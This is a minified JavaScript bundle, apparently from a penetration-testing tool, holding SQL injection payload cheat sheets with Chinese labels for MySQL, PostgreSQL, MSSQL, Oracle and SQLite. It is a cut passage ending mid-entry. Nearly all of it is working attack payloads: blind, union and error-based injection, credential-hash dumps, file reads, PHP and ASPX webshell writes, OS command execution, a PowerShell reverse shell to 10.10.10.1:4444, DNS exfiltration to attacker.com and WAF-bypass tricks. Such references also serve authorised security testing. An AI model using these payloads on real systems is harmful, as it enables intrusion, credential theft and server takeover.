import{u as B,i as f}from"./action-DbkO0_5I.js";import{l as q,ay as h,Q as w,I as r,J as o,A as S,H as i,u as l,C as O,L as C,V as R,K as g,z as P,D as v,G as N,ap as G,y as t}from"./vendor-D2QpS8Sq.js";import{_ as H}from"./tool-Tf4xlnLR.js";import"./vendor-lodash-BDISS5yc.js";import"./modulepreload-polyfill-B5Qt9EMX.js";import"./vendor-monaco-CZQ85J0D.js";const x={id:"mysql",name:"MySQL",sections:[{id:"detection",name:"探测/识别",nameEn:"Detection",payloads:[{id:"mysql-det-1",name:"版本探测",payload:"SELECT @@version"},{id:"mysql-det-2",name:"版本探测 (函数)",payload:"SELECT VERSION()"},{id:"mysql-det-3",name:"当前用户",payload:"SELECT USER()"},{id:"mysql-det-4",name:"当前用户 (SESSION)",payload:"SELECT SESSION_USER()"},{id:"mysql-det-5",name:"当前数据库",payload:"SELECT DATABASE()"},{id:"mysql-det-6",name:"服务器主机名",payload:"SELECT @@hostname"},{id:"mysql-det-7",name:"数据目录",payload:"SELECT @@datadir"}]},{id:"union",name:"联合查询",nameEn:"Union Based",payloads:[{id:"mysql-union-1",name:"判断列数 (ORDER BY)",payload:"' ORDER BY 1-- -"},{id:"mysql-union-2",name:"判断列数 (递增)",payload:"' ORDER BY 1,2,3,4,5-- -"},{id:"mysql-union-3",name:"UNION NULL 探测列数",payload:"' UNION SELECT NULL,NULL,NULL-- -"},{id:"mysql-union-4",name:"UNION 提取数据",payload:"' UNION SELECT 1,2,3-- -"},{id:"mysql-union-5",name:"UNION 提取版本+用户",payload:"' UNION SELECT 1,@@version,USER()-- -"},{id:"mysql-union-6",name:"UNION 字符串拼接",payload:"' UNION SELECT 1,CONCAT(user,':',password),3 FROM mysql.user-- -"},{id:"mysql-union-7",name:"GROUP_CONCAT 提取多行",payload:"' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"}]},{id:"blind_boolean",name:"布尔盲注",nameEn:"Boolean Blind",payloads:[{id:"mysql-bb-1",name:"基础布尔测试",payload:"' AND 1=1-- -"},{id:"mysql-bb-2",name:"布尔假值测试",payload:"' AND 1=2-- -"},{id:"mysql-bb-3",name:"SUBSTRING 逐字符提取",payload:"' AND SUBSTRING(@@version,1,1)='5'-- -"},{id:"mysql-bb-4",name:"ASCII 值比较",payload:"' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>96-- -"},{id:"mysql-bb-5",name:"IF 条件判断",payload:"' AND IF(1=1,'a','b')='a'-- -"},{id:"mysql-bb-6",name:"提取表名长度",payload:"' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1))>5-- -"}]},{id:"blind_time",name:"时间盲注",nameEn:"Time Blind",payloads:[{id:"mysql-bt-1",name:"SLEEP 延时测试",payload:"' AND SLEEP(5)-- -"},{id:"mysql-bt-2",name:"IF + SLEEP 条件延时",payload:"' AND IF(1=1,SLEEP(5),0)-- -"},{id:"mysql-bt-3",name:"BENCHMARK 延时",payload:"' AND BENCHMARK(10000000,SHA1('test'))-- -"},{id:"mysql-bt-4",name:"逐字符时间提取",payload:"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>96,SLEEP(5),0)-- -"},{id:"mysql-bt-5",name:"提取用户名 (时间)",payload:"' AND IF(SUBSTRING(USER(),1,1)='r',SLEEP(5),0)-- -"}]},{id:"error_based",name:"报错注入",nameEn:"Error Based",payloads:[{id:"mysql-err-1",name:"EXTRACTVALUE 报错",payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -"},{id:"mysql-err-2",name:"UPDATEXML 报错",payload:"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- -"},{id:"mysql-err-3",name:"FLOOR 双查询报错",payload:"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"},{id:"mysql-err-4",name:"EXP 溢出报错",payload:"' AND EXP(~(SELECT * FROM (SELECT @@version)x))-- -"},{id:"mysql-err-5",name:"BIGINT 溢出报错",payload:"' AND !(SELECT * FROM (SELECT CONCAT(@@version))x)-~0-- -"},{id:"mysql-err-6",name:"NAME_CONST 报错 (5.0)",payload:"' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)-- -"}]},{id:"data_extraction",name:"数据提取",nameEn:"Data Extraction",payloads:[{id:"mysql-de-1",name:"列出所有数据库",payload:"SELECT schema_name FROM information_schema.schemata"},{id:"mysql-de-2",name:"列出当前库所有表",payload:"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()"},{id:"mysql-de-3",name:"列出指定表的列",payload:"SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'"},{id:"mysql-de-4",name:"提取用户凭据",payload:"SELECT CONCAT(user,':',password) FROM mysql.user"},{id:"mysql-de-5",name:"GROUP_CONCAT 所有表",payload:"SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=DATABASE()"},{id:"mysql-de-6",name:"GROUP_CONCAT 所有列",payload:"SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='users'"}]},{id:"file_ops",name:"文件操作",nameEn:"File Operations",payloads:[{id:"mysql-file-1",name:"读取文件 (LOAD_FILE)",payload:"SELECT LOAD_FILE('/etc/passwd')"},{id:"mysql-file-2",name:"UNION 读取文件",payload:"' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"},{id:"mysql-file-3",name:"写入文件 (INTO OUTFILE)",payload:`' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -`},{id:"mysql-file-4",name:"写入文件 (DUMPFILE)",payload:`' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO DUMPFILE '/var/www/html/shell.php'-- -`},{id:"mysql-file-5",name:"16进制写文件绕过",payload:"' UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3 INTO OUTFILE '/var/www/html/shell.php'-- -"}]},{id:"command_exec",name:"命令执行",nameEn:"Command Execution",payloads:[{id:"mysql-cmd-1",name:"UDF 提权 (sys_exec)",payload:"SELECT sys_exec('id')",description:"需要先上传 UDF 共享库"},{id:"mysql-cmd-2",name:"UDF 创建函数",payload:"CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so'",description:"先将 .so 文件写入 plugin 目录"}]},{id:"comments",name:"注释符",nameEn:"Comments",payloads:[{id:"mysql-cmt-1",name:"单行注释 (--)",payload:"-- 注释内容"},{id:"mysql-cmt-2",name:"单行注释 (-- 空格)",payload:"-- -"},{id:"mysql-cmt-3",name:"单行注释 (#)",payload:"# 注释内容"},{id:"mysql-cmt-4",name:"URL 编码 #",payload:"%23"},{id:"mysql-cmt-5",name:"多行注释",payload:"/* 注释内容 */"},{id:"mysql-cmt-6",name:"内联注释 (执行)",payload:"/*!50000 SELECT */"}]},{id:"waf_bypass",name:"WAF 绕过",nameEn:"WAF Bypass",payloads:[{id:"mysql-waf-1",name:"大小写混合",payload:"' uNiOn SeLeCt 1,2,3-- -"},{id:"mysql-waf-2",name:"内联注释绕过",payload:"' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -"},{id:"mysql-waf-3",name:"双写绕过",payload:"' UNIunionON SELselectECT 1,2,3-- -"},{id:"mysql-waf-4",name:"空格替换 (/**/) ",payload:"'/**/UNION/**/SELECT/**/1,2,3-- -"},{id:"mysql-waf-5",name:"空格替换 (%0a)",payload:"'%0aUNION%0aSELECT%0a1,2,3-- -"},{id:"mysql-waf-6",name:"空格替换 (%09)",payload:"'%09UNION%09SELECT%091,2,3-- -"},{id:"mysql-waf-7",name:"十六进制编码字符串",payload:"' UNION SELECT 1,0x74657374,3-- -"},{id:"mysql-waf-8",name:"CHAR 编码",payload:"' UNION SELECT 1,CHAR(116,101,115,116),3-- -"},{id:"mysql-waf-9",name:"科学计数法绕过",payload:"0e1' UNION SELECT 1,2,3-- -"}]}]},W={id:"postgresql",name:"PostgreSQL",sections:[{id:"detection",name:"探测/识别",nameEn:"Detection",payloads:[{id:"pg-det-1",name:"版本探测",payload:"SELECT version()"},{id:"pg-det-2",name:"当前用户",payload:"SELECT current_user"},{id:"pg-det-3",name:"会话用户",payload:"SELECT session_user"},{id:"pg-det-4",name:"当前数据库",payload:"SELECT current_database()"},{id:"pg-det-5",name:"数据库端口",payload:"SELECT inet_server_port()"},{id:"pg-det-6",name:"服务器地址",payload:"SELECT inet_server_addr()"},{id:"pg-det-7",name:"是否超级用户",payload:"SELECT current_setting('is_superuser')"}]},{id:"union",name:"联合查询",nameEn:"Union Based",payloads:[{id:"pg-union-1",name:"判断列数",payload:"' ORDER BY 1--"},{id:"pg-union-2",name:"UNION NULL 探测",payload:"' UNION SELECT NULL,NULL,NULL--"},{id:"pg-union-3",name:"UNION 提取版本",payload:"' UNION SELECT NULL,version(),NULL--"},{id:"pg-union-4",name:"字符串拼接提取",payload:"' UNION SELECT NULL,current_user||':'||current_database(),NULL--"},{id:"pg-union-5",name:"提取所有表名",payload:"' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'--"}]},{id:"blind_boolean",name:"布尔盲注",nameEn:"Boolean Blind",payloads:[{id:"pg-bb-1",name:"基础布尔测试",payload:"' AND 1=1--"},{id:"pg-bb-2",name:"布尔假值",payload:"' AND 1=2--"},{id:"pg-bb-3",name:"SUBSTRING 提取",payload:"' AND SUBSTRING(version(),1,1)='P'--"},{id:"pg-bb-4",name:"ASCII 值比较",payload:"' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>96--"},{id:"pg-bb-5",name:"LENGTH 判断长度",payload:"' AND LENGTH((SELECT current_database()))>5--"}]},{id:"blind_time",name:"时间盲注",nameEn:"Time Blind",payloads:[{id:"pg-bt-1",name:"PG_SLEEP 延时",payload:"'; SELECT PG_SLEEP(5)--"},{id:"pg-bt-2",name:"CASE + PG_SLEEP",payload:"' AND (SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END)--"},{id:"pg-bt-3",name:"逐字符时间提取",payload:"' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))>96) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END)--"},{id:"pg-bt-4",name:"条件延时 (IF)",payload:"'; SELECT CASE WHEN (current_user='postgres') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END--"}]},{id:"error_based",name:"报错注入",nameEn:"Error Based",payloads:[{id:"pg-err-1",name:"CAST 报错",payload:"' AND 1=CAST((SELECT version()) AS INT)--"},{id:"pg-err-2",name:"CAST 提取用户",payload:"' AND 1=CAST((SELECT current_user) AS INT)--"},{id:"pg-err-3",name:"数组索引报错",payload:"' AND 1=1/(SELECT 0 FROM pg_sleep(0))::int--"}]},{id:"data_extraction",name:"数据提取",nameEn:"Data Extraction",payloads:[{id:"pg-de-1",name:"列出所有数据库",payload:"SELECT datname FROM pg_database"},{id:"pg-de-2",name:"列出所有表",payload:"SELECT table_name FROM information_schema.tables WHERE table_schema='public'"},{id:"pg-de-3",name:"列出指定表的列",payload:"SELECT column_name FROM information_schema.columns WHERE table_name='users'"},{id:"pg-de-4",name:"提取用户哈希",payload:"SELECT usename,passwd FROM pg_shadow"},{id:"pg-de-5",name:"STRING_AGG 提取所有表",payload:"SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'"},{id:"pg-de-6",name:"列出 Schema",payload:"SELECT schema_name FROM information_schema.schemata"}]},{id:"file_ops",name:"文件操作",nameEn:"File Operations",payloads:[{id:"pg-file-1",name:"读取文件 (pg_read_file)",payload:"SELECT pg_read_file('/etc/passwd')",description:"需要超级用户权限"},{id:"pg-file-2",name:"读取文件 (COPY)",payload:"CREATE TABLE tmp(data TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;"},{id:"pg-file-3",name:"写入文件 (COPY TO)",payload:`COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'`},{id:"pg-file-4",name:"大对象读文件",payload:"SELECT lo_import('/etc/passwd'); SELECT lo_get(LAST_OID)"}]},{id:"command_exec",name:"命令执行",nameEn:"Command Execution",payloads:[{id:"pg-cmd-1",name:"COPY FROM PROGRAM",payload:"COPY cmd_output FROM PROGRAM 'id'",description:"PostgreSQL 9.3+ 超级用户"},{id:"pg-cmd-2",name:"创建表 + 执行命令",payload:"CREATE TABLE cmd_output(output TEXT); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output;"},{id:"pg-cmd-3",name:"PL/pgSQL 执行命令",payload:"CREATE OR REPLACE FUNCTION cmd(text) RETURNS void AS $$ BEGIN PERFORM cmd_output FROM PROGRAM $1; END; $$ LANGUAGE plpgsql; SELECT cmd('id');",description:"需要 CREATE FUNCTION 权限"}]},{id:"comments",name:"注释符",nameEn:"Comments",payloads:[{id:"pg-cmt-1",name:"单行注释",payload:"-- 注释内容"},{id:"pg-cmt-2",name:"多行注释",payload:"/* 注释内容 */"}]},{id:"waf_bypass",name:"WAF 绕过",nameEn:"WAF Bypass",payloads:[{id:"pg-waf-1",name:"美元符号引用",payload:"$$test$$"},{id:"pg-waf-2",name:"CHR 编码绕过",payload:"SELECT CHR(65)||CHR(66)||CHR(67)"},{id:"pg-waf-3",name:"注释分隔绕过",payload:"'/**/UNION/**/SELECT/**/NULL,version(),NULL--"},{id:"pg-waf-4",name:"类型转换绕过",payload:"' UNION SELECT NULL,version()::text,NULL--"}]}]},X={id:"mssql",name:"MSSQL",sections:[{id:"detection",name:"探测/识别",nameEn:"Detection",payloads:[{id:"ms-det-1",name:"版本探测",payload:"SELECT @@version"},{id:"ms-det-2",name:"服务器名",payload:"SELECT @@servername"},{id:"ms-det-3",name:"当前用户",payload:"SELECT SYSTEM_USER"},{id:"ms-det-4",name:"当前用户 (USER_NAME)",payload:"SELECT USER_NAME()"},{id:"ms-det-5",name:"当前数据库",payload:"SELECT DB_NAME()"},{id:"ms-det-6",name:"是否 sysadmin",payload:"SELECT IS_SRVROLEMEMBER('sysadmin')"},{id:"ms-det-7",name:"服务器实例名",payload:"SELECT @@servicename"}]},{id:"union",name:"联合查询",nameEn:"Union Based",payloads:[{id:"ms-union-1",name:"判断列数",payload:"' ORDER BY 1--"},{id:"ms-union-2",name:"UNION NULL 探测",payload:"' UNION SELECT NULL,NULL,NULL--"},{id:"ms-union-3",name:"UNION 提取版本",payload:"' UNION SELECT NULL,@@version,NULL--"},{id:"ms-union-4",name:"UNION 提取用户",payload:"' UNION SELECT NULL,SYSTEM_USER,NULL--"},{id:"ms-union-5",name:"提取数据库名",payload:"' UNION SELECT NULL,DB_NAME(),NULL--"},{id:"ms-union-6",name:"字符串拼接",payload:"' UNION SELECT NULL,SYSTEM_USER+':'+DB_NAME(),NULL--"}]},{id:"blind_boolean",name:"布尔盲注",nameEn:"Boolean Blind",payloads:[{id:"ms-bb-1",name:"基础布尔测试",payload:"' AND 1=1--"},{id:"ms-bb-2",name:"布尔假值",payload:"' AND 1=2--"},{id:"ms-bb-3",name:"SUBSTRING 提取",payload:"' AND SUBSTRING(@@version,1,1)='M'--"},{id:"ms-bb-4",name:"ASCII 值比较",payload:"' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>96--"},{id:"ms-bb-5",name:"LEN 判断长度",payload:"' AND LEN((SELECT DB_NAME()))>5--"}]},{id:"blind_time",name:"时间盲注",nameEn:"Time Blind",payloads:[{id:"ms-bt-1",name:"WAITFOR DELAY",payload:"'; WAITFOR DELAY '0:0:5'--"},{id:"ms-bt-2",name:"条件延时 (IF)",payload:"'; IF (1=1) WAITFOR DELAY '0:0:5'--"},{id:"ms-bt-3",name:"逐字符时间提取",payload:"'; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>96) WAITFOR DELAY '0:0:5'--"},{id:"ms-bt-4",name:"判断 sysadmin (时间)",payload:"'; IF (IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5'--"}]},{id:"error_based",name:"报错注入",nameEn:"Error Based",payloads:[{id:"ms-err-1",name:"CONVERT 报错",payload:"' AND 1=CONVERT(INT,@@version)--"},{id:"ms-err-2",name:"CAST 报错",payload:"' AND 1=CAST(@@version AS INT)--"},{id:"ms-err-3",name:"CONVERT 提取用户",payload:"' AND 1=CONVERT(INT,(SELECT SYSTEM_USER))--"},{id:"ms-err-4",name:"CONVERT 提取 DB 名",payload:"' AND 1=CONVERT(INT,DB_NAME())--"}]},{id:"data_extraction",name:"数据提取",nameEn:"Data Extraction",payloads:[{id:"ms-de-1",name:"列出所有数据库",payload:"SELECT name FROM master..sysdatabases"},{id:"ms-de-2",name:"列出所有数据库 (系统视图)",payload:"SELECT name FROM sys.databases"},{id:"ms-de-3",name:"列出当前库的表",payload:"SELECT name FROM sysobjects WHERE xtype='U'"},{id:"ms-de-4",name:"列出表 (INFORMATION_SCHEMA)",payload:"SELECT table_name FROM information_schema.tables"},{id:"ms-de-5",name:"列出指定表的列",payload:"SELECT column_name FROM information_schema.columns WHERE table_name='users'"},{id:"ms-de-6",name:"提取 SQL 登录哈希",payload:"SELECT name,password_hash FROM sys.sql_logins",description:"需要 sysadmin 权限"},{id:"ms-de-7",name:"FOR XML 拼接多行",payload:"SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')"}]},{id:"file_ops",name:"文件操作",nameEn:"File Operations",payloads:[{id:"ms-file-1",name:"读取文件 (OPENROWSET)",payload:"SELECT * FROM OPENROWSET(BULK 'C:\\windows\\win.ini', SINGLE_CLOB) AS x"},{id:"ms-file-2",name:"读取文件 (BulkColumn)",payload:"SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\windows\\win.ini', SINGLE_CLOB) AS x"},{id:"ms-file-3",name:"OLE 写文件",payload:`DECLARE @o INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @o OUT; EXEC sp_OAMethod @o, 'OpenTextFile', NULL, 'C:\\inetpub\\wwwroot\\shell.aspx', 8, 1; EXEC sp_OAMethod @o, 'Write', NULL, '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>'`}]},{id:"command_exec",name:"命令执行",nameEn:"Command Execution",payloads:[{id:"ms-cmd-1",name:"xp_cmdshell",payload:"EXEC xp_cmdshell 'whoami'",description:"默认禁用，需要 sysadmin 权限启用"},{id:"ms-cmd-2",name:"启用 xp_cmdshell",payload:"EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"},{id:"ms-cmd-3",name:"xp_cmdshell 反弹 Shell",payload:`EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.10.1'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'`},{id:"ms-cmd-4",name:"sp_OACreate 执行",payload:"DECLARE @s INT; EXEC sp_OACreate 'WScript.Shell', @s OUT; EXEC sp_OAMethod @s, 'Run', NULL, 'cmd /c whoami > C:\\output.txt'"},{id:"ms-cmd-5",name:"SQL Agent Job 执行",payload:"USE msdb; EXEC dbo.sp_add_job @job_name='cmd_job'; EXEC sp_add_jobstep @job_name='cmd_job',@step_name='cmd',@subsystem='CmdExec',@command='whoami > C:\\output.txt'; EXEC dbo.sp_add_jobserver @job_name='cmd_job'; EXEC dbo.sp_start_job @job_name='cmd_job';"}]},{id:"comments",name:"注释符",nameEn:"Comments",payloads:[{id:"ms-cmt-1",name:"单行注释 (--)",payload:"-- 注释内容"},{id:"ms-cmt-2",name:"多行注释",payload:"/* 注释内容 */"}]},{id:"waf_bypass",name:"WAF 绕过",nameEn:"WAF Bypass",payloads:[{id:"ms-waf-1",name:"注释分隔绕过",payload:"'/**/UNION/**/SELECT/**/NULL,@@version,NULL--"},{id:"ms-waf-2",name:"括号替代空格",payload:"'UNION(SELECT(NULL),(@@version),(NULL))--"},{id:"ms-waf-3",name:"中括号绕过",payload:"' UNION SELECT NULL,[version],NULL FROM (SELECT @@version AS [version])x--"},{id:"ms-waf-4",name:"EXEC + 字符串拼接",payload:"'; EXEC('SEL'+'ECT @@ver'+'sion')--"},{id:"ms-waf-5",name:"Unicode 编码绕过",payload:"' UNION SELECT NULL,@@version,NULL FROM [dbo].%5Busers%5D--"}]}]},$={id:"oracle",name:"Oracle",sections:[{id:"detection",name:"探测/识别",nameEn:"Detection",payloads:[{id:"ora-det-1",name:"版本探测 (banner)",payload:"SELECT banner FROM v$version"},{id:"ora-det-2",name:"版本探测 (WHERE)",payload:"SELECT banner FROM v$version WHERE ROWNUM=1"},{id:"ora-det-3",name:"当前用户",payload:"SELECT user FROM dual"},{id:"ora-det-4",name:"当前用户 (SYS_CONTEXT)",payload:"SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual"},{id:"ora-det-5",name:"当前数据库 (SID)",payload:"SELECT instance_name FROM v$instance"},{id:"ora-det-6",name:"全局数据库名",payload:"SELECT global_name FROM global_name"},{id:"ora-det-7",name:"服务器主机名",payload:"SELECT SYS_CONTEXT('USERENV','HOST') FROM dual"},{id:"ora-det-8",name:"当前 Schema",payload:"SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual"}]},{id:"union",name:"联合查询",nameEn:"Union Based",payloads:[{id:"ora-union-1",name:"判断列数",payload:"' ORDER BY 1--"},{id:"ora-union-2",name:"UNION NULL 探测",payload:"' UNION SELECT NULL,NULL,NULL FROM dual--"},{id:"ora-union-3",name:"UNION 提取版本",payload:"' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--"},{id:"ora-union-4",name:"UNION 提取用户",payload:"' UNION SELECT NULL,user,NULL FROM dual--"},{id:"ora-union-5",name:"字符串拼接",payload:"' UNION SELECT NULL,user||':'||SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM dual--"}]},{id:"blind_boolean",name:"布尔盲注",nameEn:"Boolean Blind",payloads:[{id:"ora-bb-1",name:"基础布尔测试",payload:"' AND 1=1--"},{id:"ora-bb-2",name:"布尔假值",payload:"' AND 1=2--"},{id:"ora-bb-3",name:"SUBSTR 提取",payload:"' AND SUBSTR((SELECT user FROM dual),1,1)='S'--"},{id:"ora-bb-4",name:"ASCII 值比较",payload:"' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>83--"},{id:"ora-bb-5",name:"LENGTH 判断",payload:"' AND LENGTH((SELECT user FROM dual))>3--"},{id:"ora-bb-6",name:"DECODE 条件判断",payload:"' AND (SELECT DECODE(SUBSTR(user,1,1),'S',1,0) FROM dual)=1--"}]},{id:"blind_time",name:"时间盲注",nameEn:"Time Blind",payloads:[{id:"ora-bt-1",name:"DBMS_PIPE.RECEIVE_MESSAGE 延时",payload:"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"},{id:"ora-bt-2",name:"条件时间延时",payload:"' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)=1--"},{id:"ora-bt-3",name:"UTL_INADDR (DNS 延时)",payload:"' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com')--",description:"通过 DNS 请求产生延时"},{id:"ora-bt-4",name:"重查询延时",payload:"' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)>0--"}]},{id:"error_based",name:"报错注入",nameEn:"Error Based",payloads:[{id:"ora-err-1",name:"CTXSYS.DRITHSX.SN 报错",payload:"' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--"},{id:"ora-err-2",name:"UTL_INADDR 报错",payload:"' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--"},{id:"ora-err-3",name:"XMLTYPE 报错",payload:`' AND (SELECT XMLTYPE('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>') FROM dual) IS NOT NULL--`},{id:"ora-err-4",name:"TO_NUMBER 类型报错",payload:"' AND 1=TO_NUMBER((SELECT user FROM dual))--"}]},{id:"data_extraction",name:"数据提取",nameEn:"Data Extraction",payloads:[{id:"ora-de-1",name:"列出所有用户 (Schema)",payload:"SELECT username FROM all_users"},{id:"ora-de-2",name:"列出当前用户的表",payload:"SELECT table_name FROM user_tables"},{id:"ora-de-3",name:"列出所有表",payload:"SELECT owner,table_name FROM all_tables"},{id:"ora-de-4",name:"列出指定表的列",payload:"SELECT column_name FROM all_tab_columns WHERE table_name='USERS'"},{id:"ora-de-5",name:"提取用户哈希",payload:"SELECT name,password FROM sys.user$",description:"需要 DBA 权限"},{id:"ora-de-6",name:"LISTAGG 聚合提取",payload:"SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"}]},{id:"file_ops",name:"文件操作",nameEn:"File Operations",payloads:[{id:"ora-file-1",name:"UTL_FILE 读取文件",payload:"DECLARE f UTL_FILE.FILE_TYPE; s VARCHAR2(4000); BEGIN f:=UTL_FILE.FOPEN('DIRECTORY_NAME','target.txt','R'); UTL_FILE.GET_LINE(f,s); UTL_FILE.FCLOSE(f); DBMS_OUTPUT.PUT_LINE(s); END;",description:"需要 Directory 对象和权限"},{id:"ora-file-2",name:"Java 读取文件",payload:"SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper cat /etc/passwd') FROM dual",description:"需要 Java 权限"}]},{id:"command_exec",name:"命令执行",nameEn:"Command Execution",payloads:[{id:"ora-cmd-1",name:"DBMS_SCHEDULER 执行命令",payload:"BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'cmd_job',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>2,enabled=>FALSE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job',1,'-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job',2,'id > /tmp/output.txt'); DBMS_SCHEDULER.ENABLE('cmd_job'); END;",description:"需要 CREATE JOB 权限"},{id:"ora-cmd-2",name:"Java OS Command",payload:"SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c id') FROM dual",description:"需要 Java 权限"}]},{id:"comments",name:"注释符",nameEn:"Comments",payloads:[{id:"ora-cmt-1",name:"单行注释",payload:"-- 注释内容"},{id:"ora-cmt-2",name:"多行注释",payload:"/* 注释内容 */"}]},{id:"waf_bypass",name:"WAF 绕过",nameEn:"WAF Bypass",payloads:[{id:"ora-waf-1",name:"注释分隔绕过",payload:"'/**/UNION/**/SELECT/**/NULL,user,NULL/**/FROM/**/dual--"},{id:"ora-waf-2",name:"CHR 编码绕过",payload:"SELECT CHR(65)||CHR(66)||CHR(67) FROM dual"},{id:"ora-waf-3",name:"大小写混合",payload:"' uNiOn SeLeCt NULL,user,NULL fRoM dual--"},{id:"ora-waf-4",name:"空字节绕过",payload:"'%00' UNION SELECT NULL,user,NULL FROM dual--"}]}]},Y={id:"sqlite",name:"SQLite",sections:[{id:"detection",name:"探测/识别",nameEn:"Detection",payloads:[{id:"lite-det-1",name:"版本探测",payload:"SELECT sqlite_version()"},{id:"lite-det-2",name:"数据库类型确认",payload:"' AND 1=1 AND sqlite_version() IS NOT NULL--"},{id:"lite-det-3",name:"数据库文件路径",payload:"PRAGMA database_list"}]},{id:"union",name:"联合查询",nameEn:"Union Based",payloads:[{id:"lite-union-1",name:"判断列数",payload:"' ORDER BY 1--"},{id:"lite-union-2",name:"UNION NULL 探测",payload:"' UNION SELECT NULL,NULL,NULL--"},{id:"lite-union-3",name:"UNION 提取版本",payload:"' UNION SELECT NULL,sqlite_version(),NULL--"},{id:"lite-union-4",name:"提取表名 (sqlite_master)",payload:"' UNION SELECT NULL,GROUP_CONCAT(tbl_name),NULL FROM sqlite_master WHERE type='table'--"},{id:"lite-union-5",name:"提取建表语句",payload:"' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table' AND tbl_name='users'--"}]},{id:"blind_boolean",name:"布尔盲注",nameEn:"Boolean Blind",payloads:[{id:"lite-bb-1",name:"基础布尔测试",payload:"' AND 1=1--"},{id:"lite-bb-2",name:"布尔假值",payload:"' AND 1=2--"},{id:"lite-bb-3",name:"SUBSTR 提取",payload:"' AND SUBSTR(sqlite_version(),1,1)='3'--"},{id:"lite-bb-4",name:"UNICODE 值比较",payload:"' AND UNICODE(SUBSTR((SELECT tbl_name FROM sqlite_master LIMIT 1),1,1))>96--"},{id:"lite-bb-5",name:"LENGTH 判断",payload:"' AND LENGTH((SELECT tbl_name FROM sqlite_master LIMIT 1))>5--"},{id:"lite-bb-6",name:"LIKE 模糊匹配",payload:"' AND (SELECT tbl_name FROM sqlite_master LIMIT 1) LIKE 'u%'--"}]},{id:"blind_time",name:"时间盲注",nameEn:"Time Blind",payloads:[{id:"lite-bt-1",name:"RANDOMBLOB 延时",payload:"' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",description:"通过大量计算产生延时"},{id:"lite-bt-2",name:"条件 RANDOMBLOB 延时",payload:"' AND (SELECT CASE WHEN (1=1) THEN 